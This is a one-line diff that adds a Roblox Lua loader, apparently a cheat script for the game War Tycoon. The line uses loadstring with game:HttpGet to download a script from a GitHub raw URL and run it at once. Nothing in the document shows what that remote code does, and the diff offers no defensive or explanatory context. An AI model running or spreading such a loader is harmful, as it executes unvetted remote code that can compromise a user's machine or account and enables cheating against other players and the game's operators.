@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/kf-41-war-tycoon-spam4-g1oa6oczl1ofew.lua"))()
